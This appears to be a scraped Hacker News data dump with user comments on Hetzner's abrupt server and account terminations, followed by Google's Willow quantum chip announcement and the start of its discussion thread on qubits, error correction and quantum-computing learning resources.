and ask you to respond. obviously thats not a sane course of action and i cannot recommend using them for any kind of production systems. i am always angry if i see articles about them here on HN because such a vendor should be blacklisted and not promoted. reply hk__2 6 hours agoparent> if they get a copyright-violation request from someone, they won't contact you about it. they'll just take your server down immediately and ask you to respond That’s not my experience. We get these emails about once every 6 months, we act and respond, and they don’t take anything down. reply Risse 6 hours agoparentprevNot my experience as well. They have previously given me 24 hours to respond, or they will remove the server. reply ratg13 5 hours agorootparentMy experience was getting the \"you have 24 hours\" to respond e-mail, and contacting them within 20 minutes, only to be passed around a phone system to be finally told, sorry everything has been deleted. They offered to \"recover\" the account, which was basically just an account shell with my info. All of the assets and backups had been permanently erased. reply JohnBooty 5 hours agorootparentprevYikes. That's just about as scary. reply SirensOfTitan 6 hours agorootparentprevThat’s hardly any better. reply diggan 6 hours agoparentprev> i am always angry if i see articles about them here on HN because such a vendor should be blacklisted and not promoted. Is it possible that maybe others had a different experience than you, and those experiences are as valid as your own? Besides, what was your website about? I've received notices I had to reply to within 24-hours, otherwise they delete the servers. But I've always replied and complied, so never had any servers deleted. reply tailspin2019 6 hours agorootparentYour experience doesn’t sound a great deal better and also puts me off this provider. 24-hours is almost synonymous with no warning in my book. How many contact attempts can reasonably be made in that time? If it’s a single email - then even if it doesn’t get caught in a Spam filter that’s still a short period of time to notice and respond when the stakes are so high. If that email goes to junk, or you’re unwell and not checking emails as frequently (given - I assume - that many of Hetzner’s customers are individuals) or any other number of reasonable situations, you’ve effectively had no warning before service termination and deletion of data. I don’t mind cloud providers acting on suspicious usage patterns or abuse reports but there has to be some kind of due process or it just ends up unnecessarily destroying goodwill in a brand/provider. reply bryanrasmussen 6 hours agorootparent>If it’s a single email - then even if it doesn’t get caught in a Spam filter that’s still a short period of time to notice and respond when the stakes are so high. What size company would you have to be where a 24 hour notice would not be problematic? I'm actually curious as to opinions here, and understand that obviously part of it is how well managed are your employee leave messaging etc. I know one company with a very good manager and I think they would have managed it with 5 people being in the group of people who would handle this kind of thing (keeping track of all services etc. Obviously only 1-2 person does this but redundancy so it falls back when they are on vacation), slightly over 30 people in company size altogether. If you're a startup of 3 people for example 24 hours might be game over. reply JohnBooty 5 hours agorootparentIf you're a startup of 3 people for example 24 hours might be game over. Yeah, I was considering them for my part time projects and some small PaaS-ish stuff. Not now. Realistically to have 24/365 email coverage you'd need like, full-time founders or at least a couple of paid employees. For what I was considering, I will be a \"founder\" but I'll still be working my day job. So effectively that is > 16 hours per day (work + sleep) I need to dedicate to the day job. While I will generally be able to respond within 24 hours, I can't 100% guarantee it. reply dinkblam 6 hours agorootparentprev> Besides, what was your website about? I've received notices I had to reply to within 24-hours, otherwise they delete the servers. But I've always replied and complied, so never had any servers deleted. some random app vendor didn't like the free promotion on our website https://macupdater.net/ we can delete any \"offending\" page within a few hours, but taking the whole server offline first and asking questions later is not OK by Hetzner. others had better experiences and got a 24-hour timeframe. just asking but is this during business hours or can they send you a notice on saturday and you'll be offline by sunday? doesn't seem much better. reply JohnBooty 5 hours agorootparentprev\"24 hours notice before server deletion\" makes them a no-go for me, then. I was considering them for a small project, but as this project will be nobody's fulltime job, I can't guarantee that I or anybody else would necessarily see that email within 24 hours. reply bww 6 hours agorootparentprevInteresting, and this kind of service seems fine to you? It doesn’t seem fine to me. Even if most people will have no problem with them, I’d say that knowing how a company handles edge cases like this is much more valuable than knowing how the handle things when everything is fine. reply janmo 6 hours agoparentprevWhen they receive a DMCA they will contact you and give you 24hours to reply and fix it. If you do not comply they will turn off your IP. However this is more related to EU regulation rather than Hetzner itself. Hosting things within the EU has become really tough. reply diggan 6 hours agorootparent> Hosting things within the EU has become really tough. I, as a European, using mostly dedicated servers within the EU (including Hetzner) haven't noticed this at all. What are you referring to specifically? Some \"use cases\" like building marketing profiles and alike certainly has gotten harder, but that's a feature so I'm guessing you're not referring to that. I don't think general \"hosting things\" has become any harder than before, assuming you're not trying to slurp up as much data as possible. reply jeltz 6 hours agorootparentprevWhich EU regulation? I don't know of any relevant to this. Only American law. reply mike_hearn 6 hours agorootparentIt's German not EU level, the NetzDG act has a 24 hour turnaround time for taking down content that is \"clearly\" illegal: https://en.wikipedia.org/wiki/Network_Enforcement_Act Unfortunately the act is designed to block vague categories like \"hate speech\" and \"misinformation\" and has huge fines attached, so it's designed to ensure that very trigger-happy enforcement is the only workable strategy. It was written to whack Facebook and Google primarily but it's possible that the wording also captures Hetzner, or they're worried that it might. If they do feel they fall under it then they'd probably have to automate takedowns in response to abuse reports. As otherwise they'd need 24/7 on-call content reviewers, which goes against their low cost nature. So if this is the cause it's really an issue with German law being unfriendly to smaller/cheaper content hosters. reply Tomte 5 hours agorootparentThe NetzDG only applies to platforms, and only to ones above 2 million users. reply jkaplowitz 6 hours agorootparentprevAt least when they try to comply with NetzDG they should also try to store the deleted data for 10 weeks as per the law. That clearly didn’t happen in OP’s case, so it was either Hetzner failing to retain as required or not a NetzDG situation at all. reply dinkblam 6 hours agorootparentprev> When they receive a DMCA they will contact you and give you 24hours to reply and fix it. If you do not comply they will turn off your IP. they did NOT give any 24 hours. reply InsideOutSanta 6 hours agorootparentprevIt might be more related to German regulation than to EU regulation. Germany has some pretty strict laws related to speech, for example. My understanding is that Kiwix mirrored Wikipedia data on Hetzner's servers, and I'm almost 100% sure that Wikipedia contains things that are completely fine in the US, but technically illegal in Germany. I have no idea if that was the reason, though. reply theshrike79 6 hours agoparentprev\"Hetzner\" isn't a monolith. I have a feeling these things depend on which country your servers are in. f.ex. the situation with egress costing money in the US, but it's free on all EU location.s reply diggan 6 hours agorootparent> f.ex. the situation with egress costing money in the US, but it's free on all EU location.s Aren't you confusing Hetzner Cloud with Hetzner Robot (dedicated servers) here? AFAIK, Cloud has egress costs while Robot is usually unmetered. reply anonzzzies 6 hours agoparentprevWe always get a warning. reply throwaway290 6 hours agoparentprevDMCA safe harbor means you don't get sued for posting copyrighted content. But in return it means you get a notice you gotta take things down. If you don't take it down then it goes down the infra. You can take down a post but your hoster can't. But they can take down your server. And they must or they get fines/jail. And so they will. Now we need to know the full story. Did you have a public DMCA takedown link and actually handle requests and the complainers just ignored that and went over your head to Herzner? or did you just wing it running a server with UGC thinking it's surely gonna be OK? I am not saying you were wrong but you only tell a small part of the story reply trilbyglens 6 hours agoparentprevTbh this is the most German shit. Germany has borderline neurotic copyright laws, so likely they are doing this to cover their asses legally. Still insane that they don't even notify you!! reply surrTurr 6 hours agoprevNot the first time this is happening: - Hetzner banned me with no explanation. What can I do? (https://news.ycombinator.com/item?id=32318524) - Hetzner didn't even provide a detailed info on why they deactivated my account (https://news.ycombinator.com/item?id=40781617) reply unixhero 6 hours agoprevHetzner froze my account because I owed them 0.02 EURO's. It was not possible to pay it with a VISA credit or VISA debit, nor Amex card. They required me to wire transfer the money. However my bank does not allow the wiring of a 0.02 EURO amount, as the amount is too low. Out of pure spite I built my own data center. reply ivan_gammel 6 hours agoparentDid you try to send them 20€ and request refund of excessive amount? reply digital_voodoo 6 hours agorootparentA customer shouldn't be the one going through such hops in order to \"satisfy\" a provider who can't bother to accept a widely used mean of payment reply BillLumbergh 7 hours agoprevBeen seeing a lot of negative posts surrounding experiences with Hetzner of late. Definitely facing issues and losing reputation. reply jumperabg 7 hours agoparentWhen you ride the cloud/ai hype wave you end up with making fast and not very healthy decisions. Same things happen with other providers so whatever is your choice you must have disaster recovery and replication in place. If you wanna go cheap just make some s3 backups on R2, BackBlaze, Wasabi. reply sertraline 6 hours agorootparentHetzner was always like that, even before the AI wave. They lowball people with cheap pricing and arguably this attracts a lot of \"unwanted\" people, so Hetzner always acted strict on such issues. Last time I used them (pre-2020) they were going as far as requesting customer's ID and rejecting them on the basis of country of origin, and I assume this also includes facial features that may resemble \"an average scammer\". Obviously this did not happen to European/American IPs so they never faced such issues, and as such this practice was invisible to the world. I can say for sure OVH and Scaleway would try to negotiate with you before erasing your data - this may have changed over the years. reply nchmy 5 hours agorootparentprevOr Hetzner Object Storage! Was released last week and, as you'd expect, cheaper than all of the above (though r2 would be cheapest if you need a lot of bandwidth, since it's free with them) reply amyames 4 hours agoprevFor anyone else who needs to hear this, Hi, I don’t have a mastodon to reply directly to you. But i have had some issues with content being taken down by VPS providers as well. What I’ve found works well is to use a VPS provider that the public is unaware of. And for some time I had used OVH based on the unlimited bandwidth and the reasoning that Wikipedia and Julian assange (who have far more enemies than I ever will) were using OVH. I don’t know if that’s true any more because I subsequently moved my content to ENS and IPFS. Anyway regardless of where your content is actually hosted or lives, What I had done was turn my “real” servers into content origins , which were concealed form the rest of the world and lock it down in the firewall so it could only be reached by disposable squid proxy servers with a 10-liner config file Then I pointed DNS , cloud flare etc at the squid nodes And couldn’t care less if they were taken down. Because I could deploy new ones in minutes elsewhere. I didn’t have “bad content”, just ruthless business competition that kept coming at me like Tonya Harding. And I’m sharing because your content didn’t seem too offensive either. In the front end VPS nodes you’d just put the real address of your content as the remote origin. And then nobody but you will ever know where it is. Then generally your hosting company shouldn’t be aware of what it is either unless they’re snooping around in your files, and if they are, hell with them too. You’re welcome to pass this along as a remark on avoiding censorship, or keep it to yourslelf as proprietary information I don’t mind. Let me know if you want or need an example squid conf. It’s seriously 10 lines at most and many examples found on google. reply 9cb14c1ec0 6 hours agoprevI can't stress how important it is to own your own hardware and colocate. Also, if you are paying for a dedicated server, you can often save money by moving to colocation. reply grishka 6 hours agoparentWhat if you don't want to host your stuff in the same jurisdiction where you live because you don't trust your government? reply 9cb14c1ec0 6 hours agorootparentThere are colocation datacenters all over the world. reply grishka 4 hours agorootparentSure, but if something goes wrong with your colocated server, you're supposed to fix it yourself, aren't you? So it feels kinda important that the datacenter is close enough so you could get there quickly on a short notice. I'm imagining having to fly several hours and cross borders just to replace a failed hard drive, all while your server is down. reply kirubakaran 2 hours agorootparentYou can use \"remote hands\" service to some extent. For example: http://www.he.net/tour/Fremont_2_220_Remote_Hands_Service.ht... You could leave a stack of HDDs and other consumables in your server cabinet for them. reply lakomen 6 hours agoparentprevColo is a lot more expensive than some dedi or VM somewhere. Can you provide me with a 12 core 32gb ecc 2TB ssd for 33eur/m? I doubt it. reply 9cb14c1ec0 6 hours agorootparentYou have to compare the actually performance of the dedi or VM. Cheap dedis and VMs are usually old, cheap hardware with relatively bad performance. I'm running a 20 core, 96 GB ram, 8TB colocated server for $55/month. reply matthewaveryusa 6 hours agoprev8TB isn't too bad to restore. At that scale they can backup on a local drive daily for very little money reply tucnak 6 hours agoparentBacking up to local RAID is nice, unless you're using local RAID as your primary storage in the first place, like we do. I'd looked into using a combination of AWS S3 Glacier and FUSE (s3fs?) for rigging snapshots to S3 via btrbk but it seems the semantics of Glacier don't align all too well, and backing up 40 TB+ worth of WAL on a monthly to S3 is more expensive than it should be unless you're using that storage class. reply keraf 4 hours agoprevBeen a Hetzner customer for years and have considered using them for a new business project of mine. Will reconsider it partly after reading this. At least use a separate provider for backups so I can quickly recover, just in case. Seeing it happen to a reputable project such as Kiwix [0] definitely damages my perception of Hetzner. I've read numerous complains on Reddit a few months ago but they mostly boiled down to breaching the ToS in obvious ways. Still, not giving a heads up before cancelling a service and no option to recover data is just bad business practice. [0] (I've deployed Pi's with Kiwix in remote areas in Africa, it's an amazing project) reply tmikaeld 4 hours agoprevWould be good to have a fall-back solution, is there something similar in dedicated server price in the EU as Hetzner? Or does no on else come close? reply Havoc 5 hours agoprevThey do normally send out termination mails. You can see an example of one here (note the full month notice) https://lowendspirit.com/discussion/comment/191966#Comment_1... Would definitely be good to hear hetzners side of the story because all the cases I’ve seen thus far turned out to be a case of initial telling being understandably upset but leaving out crucial details. They definitely are trigger happy with telling customers to find someone else & generally don’t elaborate on why reply t_sawyer 34 minutes agoprevThe biggest issue I have had with Hetzner was with a dedicated server. I was constantly (3 times or more a week) getting abuse messages about my MAC address not being correct: \"\"\"\" We have detected that your server is using different MAC addresses from those allowed by your Robot account. Please take all necessary measures to avoid this in the future and to solve the issue. We also request that you send a short response to us. This response should contain information about how this could have happened and what you intend to do about it. In the event that the following steps are not completed successfully, your server can be locked at any time after DATEHERE. How to proceed: - Solve the issue - Please note, in case you have fixed the problem, please wait at least 10 minutes before rechecking: https://abuse.hetzner.com/retries/?token=TOKENHERE - After successfully testing that the issue is resolved, send us a statement by using the following link: https://abuse.hetzner.com/statements/?token=TOKENHERE Please visit our FAQ here, if you are unsure how to proceed: https://docs.hetzner.com/robot/dedicated-server/faq/error-fa... \"\"\" I was just using standard Docker to host a web app. No proxmox or KVM of any sort. I would just wait the 10 minutes, click their link https://abuse.hetzner.com/retries/?token=TOKENHERE, which would retry and would come back fine and my response would be \"I changed nothing and the retry came back solved. I've done tcpdumps over a weeks time to see if any MAC addresses leak from the OS and none have while a similar ticket like this gets opened every couple days.\" The ticket would close shortly after I submitted. I inquired to them at least twice about this and they just kept telling me I was leaking a MAC address that I wasn't allowed to even when I had proof of tcpdumps over a week time period. I found someone else who had this issue with them (most issues around this that I found were people hosting Proxmox) and they had Hetzner replace the NIC and it fixed the issue. Well, Hetzner wouldn't replace my NIC because \"it was working\" even though I referenced these abuse tickets. I ended up getting another dedicated server, migrated my app over there, and I haven't had issues since. Their support is seriously not very good. Since that experience, I have had backups elsewhere and test restoring those backups regularly. The price to performance I get from them is unbeatable and like I said, I haven't had issues since getting a new machine. But, I'm definitely cautious and don't exactly trust things to not go sideways even though it's been 2 years since that experience. reply dabeeeenster 6 hours agoprevThis is not good. It does raise an interesting question of how to reliably contact a customer if email is broken? reply rnmkr 3 hours agoprevWe need to boycott hetzner. reply wenbin 6 hours agoprevhetzner is cheap, but cheap often has hidden costs / risks. aws, azure, and gcp aren’t cheap , but they offer better stability—both technically and operationally. reply nithril 6 hours agoparentaws, azure and gcp aren't cheap for sure, but for sure they are doing a lot of money reply tucnak 6 hours agoprevPeople don't like hearing this, but Hetzner support is horrible. In the two years we'd had an account with them having used numerous auctioned boxes, we had to reach out to support a handful of times, and every single time they'd started the conversation by telling us it's not their business to help us. They supposedly only help if something's broken, however when we DID run into technical issues, like NVMe's slowing down to a halt, or transient networking issues, they would go out of their way to tell us they don't give a shit. We cancelled our account last month because of that. I cannot imagine the world of hurt that we'd be ushered in, had they actually dropped our data wholesale like they did for OP. reply OutOfHere 6 hours agoprevI don't know why this is a surprise to anyone wrt Hetzner. Users have repeatedly warned that Hetzner terminates accounts of clients that they do not like. Hetzner does this without warning, even having the audacity to send you a bill thereafter. As an example, you run any crypto related operation, even if it's a mere 5% of your workload, you will have this happen to you. You don't even have to be hosting anything at all. reply starfezzy 6 hours agoprevHuge missed opportunity to use “name-and-fame”. reply lakomen 6 hours agoprevI've had many bad experiences with Hetzner, from taking my server offline because someone posted something bad and created an Abuse report, to unwillingness to cooperate to let me keep my ipv6 subnet after a forced move of data centers, to many minor shenanigans. Oh and banning my forum account because I was defending myself against some racist accusations (he was the racist) I am always recommending to not build on Hetzner. Ok but on topic, who is this guy and why did they do this to him? reply hk__2 7 hours agoprevThis thread is not really interesting because we don’t have the Hetzner’s side of the story. reply Retr0id 6 hours agoparentThe lack of response from Hetzner is part of what does make it interesting. reply 42lux 6 hours agorootparentNo response usually means it's a legal case. reply diggan 6 hours agorootparentOr, it's 13:00 on a Monday in Berlin, customer support/PR department just got started and are working through the weekend backlog, haven't had time yet to respond in any reasonable way. reply maccard 6 hours agorootparentIf you terminate accounts on/over a weekend, you should have support staff over the weekend. reply diggan 6 hours agorootparentI didn't mean to imply there is no customer support on weekends, but usually you have a weekend crew that is a lot smaller than the typical work-week crew, so there are still things to catch up on after a weekend, even with crew working weekends. reply hk__2 6 hours agorootparentprevIt makes it intriguing, not interesting. reply vitehozonage 6 hours agorootparentI'm a native English speaker but i have no idea what you mean by that since the words are almost synonyms reply hk__2 4 hours agorootparentI meant that it generates curiosity, but it does not satisfy it. reply JeremyNT 1 hour agoparentprevI agree and don't think you should be downvoted for this opinion. With only one side of the story it's impossible to draw any conclusions yet. Of course there is usually a bit of a chicken and egg issue with this sort of thing. Many companies only respond at all when complaints go viral on sites such as hn. reply dsign 6 hours agoparentprevnext [2 more] [flagged] Retr0id 6 hours agorootparentMastodon has nothing to do with this. reply riiii 6 hours agoparentprevAdverse inferance. The company thinks it's better for them to keep quiet than to tell their side. That speaks volumes. reply jgalt212 6 hours agoprevOf course, this is very concerning. I'll wait to see what their response is. I do understand there's many reasons to trash Hetzner as they are much much cheaper than the big 3 hyperscalers and many HN posters are employed by them. reply nailer 6 hours agoprevHetzner did something similar a couple of years ago, suddenly disabling 1000 Solana validators that were using their service: https://www.theblock.co/post/182283/1000-solana-validators-g... reply diggan 6 hours agoparentThat doesn't sound very similar at all. Their Terms and Conditions specifically say they don't allow cryptocurrency mining or similar, so hardly surprising that they shut down something like Solana validators. reply nailer 3 hours agorootparentSolana validators do not perform cryptocurrency mining. reply diggan 2 hours agorootparentI'm well aware of this. Read the T&C and I'm sure even you can understand the intent. reply okasaki 6 hours agoprevThat sucks. I was literally trying to download some files into kiwix and it didn't work. Some of the files they host are pretty big, so maybe Hetzner just decided it wasn't worth hosting any more. I've been using Hetzner for years though and never had an issue. But I don't get anywhere close to the 20TB traffic limit. This reminds me that I should set up some backups though. reply rvz 6 hours agoprevUnsuprising. The crypto validators in the past were the canaries in the coal mine for Hetzner and almost no-one cared when they were cancelled off of Hetzner. Now they terminated your servers and the same has happened to them. After all, Hetzner is now priotizing shareholder value and is removing smaller customers wasting their compute resources. reply indigo945 6 hours agoparentHow do smaller customers \"waste\" Hetzner's compute resources? If anything, from Hetzner's point of view, smaller customers make more efficient use of those resources than bigger customers do -- because they pay more money for the same service! reply Havoc 5 hours agorootparent[not OP] Crypto validators can be quite noisy neighbours which is a problem on fair use VPS Dont think it relates to small or not reply cpursley 7 hours agoprevnext [3 more] [flagged] Tomte 6 hours agoparentKiwix does not operate Mastodon servers. reply cpursley 4 hours agorootparentDeep. Thanks, my brain apparently does not work while I’m fasting. reply lomkju 6 hours agoprev [2 more] [flagged] huhtenberg 6 hours agoparent [–] Resist the urge to self-promote this way. It comes across as being very tacky. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [],
    "commentSummary": [
      "Hetzner's account cancellation and server termination have prompted discussions on the necessity of backups and disaster recovery plans.",
      "Users shared experiences of Hetzner's strict Terms of Service (ToS) enforcement, including immediate server shutdowns for violations, raising concerns about cloud provider reliability.",
      "The debate emphasized the risks of depending on a single provider and the importance of using multiple providers for backups to ensure data security."
    ],
    "points": 216,
    "commentCount": 127,
    "retryCount": 0,
    "time": 1733744925
  },
  {
    "id": 42367649,
    "title": "Willow, Our Quantum Chip",
    "originLink": "https://blog.google/technology/research/google-willow-quantum-chip/",
    "originBody": "Breadcrumb Technology Research Meet Willow, our state-of-the-art quantum chip Dec 09, 2024 · 7 min read Share Twitter Facebook LinkedIn Mail Copy link Our new chip demonstrates error correction and performance that paves the way to a useful, large-scale quantum computer Hartmut Neven Founder and Lead, Google Quantum AI Read AI-generated summary General summary Google has developed a new quantum chip called Willow, which significantly reduces errors as it scales up, a major breakthrough in quantum error correction. Willow also performed a computation in under five minutes that would take a supercomputer 10 septillion years, demonstrating its potential for solving complex problems beyond the reach of classical computers. This achievement marks a significant step towards building commercially relevant quantum computers that can revolutionize fields like medicine, energy, and AI. Summaries were generated by Google AI. Generative AI is experimental. Bullet points Google's new quantum chip, Willow, is a major step towards building a useful, large-scale quantum computer. Willow reduces errors exponentially as it scales up, achieving a breakthrough in quantum error correction. Willow performed a benchmark computation in under five minutes that would take a supercomputer 10 septillion years. Willow's performance is a sign that useful, very large quantum computers can be built. Google is working on developing quantum algorithms that can solve real-world problems. Summaries were generated by Google AI. Generative AI is experimental. Explore other styles: General summary Bullet points Share Twitter Facebook LinkedIn Mail Copy link Today I’m delighted to announce Willow, our latest quantum chip. Willow has state-of-the-art performance across a number of metrics, enabling two major achievements. The first is that Willow can reduce errors exponentially as we scale up using more qubits. This cracks a key challenge in quantum error correction that the field has pursued for almost 30 years. Second, Willow performed a standard benchmark computation in under five minutes that would take one of today’s fastest supercomputers 10 septillion (that is, 1025) years — a number that vastly exceeds the age of the Universe. The Willow chip is a major step on a journey that began over 10 years ago. When I founded Google Quantum AI in 2012, the vision was to build a useful, large-scale quantum computer that could harness quantum mechanics — the “operating system” of nature to the extent we know it today — to benefit society by advancing scientific discovery, developing helpful applications, and tackling some of society's greatest challenges. As part of Google Research, our team has charted a long-term roadmap, and Willow moves us significantly along that path towards commercially relevant applications. 10:25 A video with Director of Quantum Hardware Julian Kelly introducing Willow and its breakthrough achievements Exponential quantum error correction — below threshold! Errors are one of the greatest challenges in quantum computing, since qubits, the units of computation in quantum computers, have a tendency to rapidly exchange information with their environment, making it difficult to protect the information needed to complete a computation. Typically the more qubits you use, the more errors will occur, and the system becomes classical. Today in Nature, we published results showing that the more qubits we use in Willow, the more we reduce errors, and the more quantum the system becomes. We tested ever-larger arrays of physical qubits, scaling up from a grid of 3x3 encoded qubits, to a grid of 5x5, to a grid of 7x7 — and each time, using our latest advances in quantum error correction, we were able to cut the error rate in half. In other words, we achieved an exponential reduction in the error rate. This historic accomplishment is known in the field as “below threshold” — being able to drive errors down while scaling up the number of qubits. You must demonstrate being below threshold to show real progress on error correction, and this has been an outstanding challenge since quantum error correction was introduced by Peter Shor in 1995. There are other scientific “firsts” involved in this result as well. For example, it’s also one of the first compelling examples of real-time error correction on a superconducting quantum system — crucial for any useful computation, because if you can’t correct errors fast enough, they ruin your computation before it’s done. And it’s a \"beyond breakeven\" demonstration, where our arrays of qubits have longer lifetimes than the individual physical qubits do, an unfakable sign that error correction is improving the system overall. As the first system below threshold, this is the most convincing prototype for a scalable logical qubit built to date. It’s a strong sign that useful, very large quantum computers can indeed be built. Willow brings us closer to running practical, commercially-relevant algorithms that can’t be replicated on conventional computers. 10 septillion years on one of today’s fastest supercomputers As a measure of Willow’s performance, we used the random circuit sampling (RCS) benchmark. Pioneered by our team and now widely used as a standard in the field, RCS is the classically hardest benchmark that can be done on a quantum computer today. You can think of this as an entry point for quantum computing — it checks whether a quantum computer is doing something that couldn’t be done on a classical computer. Any team building a quantum computer should check first if it can beat classical computers on RCS; otherwise there is strong reason for skepticism that it can tackle more complex quantum tasks. We’ve consistently used this benchmark to assess progress from one generation of chip to the next — we reported Sycamore results in October 2019 and again recently in October 2024. Willow’s performance on this benchmark is astonishing: It performed a computation in under five minutes that would take one of today’s fastest supercomputers 1025 or 10 septillion years. If you want to write it out, it’s 10,000,000,000,000,000,000,000,000 years. This mind-boggling number exceeds known timescales in physics and vastly exceeds the age of the universe. It lends credence to the notion that quantum computation occurs in many parallel universes, in line with the idea that we live in a multiverse, a prediction first made by David Deutsch. These latest results for Willow, as shown in the plot below, are our best so far, but we’ll continue to make progress. Computational costs are heavily influenced by available memory. Our estimates therefore consider a range of scenarios, from an ideal situation with unlimited memory (▲) to a more practical, embarrassingly parallelizable implementation on GPUs (⬤). Our assessment of how Willow outpaces one of the world’s most powerful classical supercomputers, Frontier, was based on conservative assumptions. For example, we assumed full access to secondary storage, i.e., hard drives, without any bandwidth overhead — a generous and unrealistic allowance for Frontier. Of course, as happened after we announced the first beyond-classical computation in 2019, we expect classical computers to keep improving on this benchmark, but the rapidly growing gap shows that quantum processors are peeling away at a double exponential rate and will continue to vastly outperform classical computers as we scale up. 10:25 A video with Principal Scientist Sergio Boixo, Founder and Lead Hartmut Neven, and renowned physicist John Preskill discussing random circuit sampling, a benchmark that demonstrates beyond-classical performance in quantum computers. State-of-the-art performance Willow was fabricated in our new, state-of-the-art fabrication facility in Santa Barbara — one of only a few facilities in the world built from the ground up for this purpose. System engineering is key when designing and fabricating quantum chips: All components of a chip, such as single and two-qubit gates, qubit reset, and readout, have to be simultaneously well engineered and integrated. If any component lags or if two components don't function well together, it drags down system performance. Therefore, maximizing system performance informs all aspects of our process, from chip architecture and fabrication to gate development and calibration. The achievements we report assess quantum computing systems holistically, not just one factor at a time. We’re focusing on quality, not just quantity — because just producing larger numbers of qubits doesn’t help if they’re not high enough quality. With 105 qubits, Willow now has best-in-class performance across the two system benchmarks discussed above: quantum error correction and random circuit sampling. Such algorithmic benchmarks are the best way to measure overall chip performance. Other more specific performance metrics are also important; for example, our T1 times, which measure how long qubits can retain an excitation — the key quantum computational resource — are now approaching 100 µs (microseconds). This is an impressive ~5x improvement over our previous generation of chips. If you want to evaluate quantum hardware and compare across platforms, here is a table of key specifications: Willow’s performance across a number of metrics. What’s next with Willow and beyond The next challenge for the field is to demonstrate a first \"useful, beyond-classical\" computation on today's quantum chips that is relevant to a real-world application. We’re optimistic that the Willow generation of chips can help us achieve this goal. So far, there have been two separate types of experiments. On the one hand, we’ve run the RCS benchmark, which measures performance against classical computers but has no known real-world applications. On the other hand, we’ve done scientifically interesting simulations of quantum systems, which have led to new scientific discoveries but are still within the reach of classical computers. Our goal is to do both at the same time — to step into the realm of algorithms that are beyond the reach of classical computers and that are useful for real-world, commercially relevant problems. Random circuit sampling (RCS), while extremely challenging for classical computers, has yet to demonstrate practical commercial applications. We invite researchers, engineers, and developers to join us on this journey by checking out our open source software and educational resources, including our new course on Coursera, where developers can learn the essentials of quantum error correction and help us create algorithms that can solve the problems of the future. My colleagues sometimes ask me why I left the burgeoning field of AI to focus on quantum computing. My answer is that both will prove to be the most transformational technologies of our time, but advanced AI will significantly benefit from access to quantum computing. This is why I named our lab Quantum AI. Quantum algorithms have fundamental scaling laws on their side, as we’re seeing with RCS. There are similar scaling advantages for many foundational computational tasks that are essential for AI. So quantum computation will be indispensable for collecting training data that’s inaccessible to classical machines, training and optimizing certain learning architectures, and modeling systems where quantum effects are important. This includes helping us discover new medicines, designing more efficient batteries for electric cars, and accelerating progress in fusion and new energy alternatives. Many of these future game-changing applications won’t be feasible on classical computers; they’re waiting to be unlocked with quantum computing. POSTED IN: Research",
    "commentLink": "https://news.ycombinator.com/item?id=42367649",
    "commentBody": "Willow, Our Quantum Chip (blog.google)209 points by robflaherty 2 hours agohidepastfavorite153 comments vessenes 1 hour agoI’m a quantum dabbler so I’ll throw out an armchair reaction: this is a significant announcement. My memory is that 256 bit keys in non quantum resistant algos need something like 2500 qubits or so; and by that I mean generally useful programmable qubits. To show a bit over 100 qubits with stability, meaning the information survives a while, long enough to be read, and general enough to run some benchmarks on is something many people thought might never come. There’s a sort of religious reaction people have to quantum computing: it breaks so many things that I think a lot of people just like to assume it won’t happen: too much in computing and data security will change -> let’s not worry about it. Combined with the slow pace of physical research progress (Schorrs algorithm for quantum factoring was mid 90s), and snake oil sales companies, it’s easy to ignore. Anyway seems like the clock might be ticking; AI and data security will be unalterably different if so. Worth spending a little time doing some long tail strategizing I’d say. reply JanisErdmanis 1 hour agoparentThe required number of qubits to execute Shor’s algorithm is way larger than 2500 qubits as the error ceiling for logical qubits must decrease exponentially with every logical qubit added to produce meaningful results. Hence, repeated applications of error correction or an increase in the surface code would be required. That would significantly blow up the number of physical qubits needed. reply goatking 1 hour agoparentprevHow can I, a regular software engineer, learn about quantum computing without having to learn quantum theory? > Worth spending a little time doing some long tail strategizing I’d say any tips for starters? reply potsandpans 1 hour agorootparentStart here: https://youtu.be/F_Riqjdh2oM You don't need to know quantum theory necessarily, but you will need to know some maths. Specifically linear algebra. There are a few youtube courses on linear algebra For a casual set of video: - https://youtube.com/playlist?list=PLZHQObOWTQDPD3MizzM2xVFit... For a more formal approach: - https://youtube.com/playlist?list=PL49CF3715CB9EF31D And the corresponding open courseware - https://ocw.mit.edu/courses/18-06-linear-algebra-spring-2010... Linear algebra done right comes highly recommended - https://linear.axler.net/ reply zitterbewegung 1 hour agorootparentprevI recommend this book I studied it in Undergrad and I never took a quantum theory course. https://www.amazon.com/Quantum-Computing-Computer-Scientists... reply raidicy 1 hour agorootparentAre there any insights that you can give based off the info you've learned about quantum computation that you might not have been able to reach if you hadn't learned about it? From my __very__ shallow understanding, because all of the efficiency increases are in very specific areas, it might not be useful for the average computer science interested individual? reply zitterbewegung 9 minutes agorootparentNearly all of quantum computation is theoretical algorithms and the hard engineering problems haven't been solved. Most of the math though has a large amount of overlap of AI / ML and all of deep learning to the point that there exist algorithms that can execute optimized Quantum Machine learning [1]. Quantum computing could be learned with a limited understanding of Quantum theory unless you are trying to engineer the hardware. https://en.wikipedia.org/wiki/Quantum_machine_learning reply sshb 1 hour agorootparentprevMight be worth checking out: https://quantum.country/ reply jvanderbot 1 hour agorootparentprevThere is a course mentioned in the article, but I'm not clear on how \"theory\" it is. https://coursera.org/learn/quantum-error-correction reply carabiner 11 minutes agorootparentprevFirst learn about eigenvalues. reply isoprophlex 1 hour agoparentprevData security okay. But AI? How will that change? reply thrance 1 hour agoparentprevThe error rates given are still horrendous and nowhere near low enough for the Quantum Fourier Transform used by Shor's algorithm. Taking qubit connectivity into account, a single CX between 2 qubits that are 10 edges aways gives an error rate of 1.5%. Also, the more qubits you have/the more instructions are in your program, the faster the quantum state collapses. Exponentially so. Qubit connectivity is still ridiculously low (~3) and does not seem to be improving at all. About AI, what algorithm(s) do you think might have an edge over classical supercomputers in the next 30 years? I'm really curious, because to me it's all (quantum) snake oil. reply LeftHandPath 11 minutes agorootparentRe: AI, it's a long way off still. The big limitation to anything quantum is always going to be decoherence and t-time [0]. To do anything with ML, you'll need whole circuit (more complex than shor's) just to initialize the data on the quantum device; the algorithms to do this are complex (exponential) [1]. So, you have to run a very expensive data-initialization circuit, and only then can you start to run your ML circuit. All of this needs to be done within the machine's t-time limit. If you exceed that limit, then the measured state of a qubit will have more to do with outside-world interactions than interactions with your quantum gates. Google's willow chip has t-times of about 60-100mu.s. That's not an impressive figure -- in 2022, IBM announced their Eagle chip with t-times of around 400mu.s [2]. Google's angle here would be the error correction (EC). The following portion from Google's announcement seems most important: > With 105 qubits, Willow now has best-in-class performance across the two system 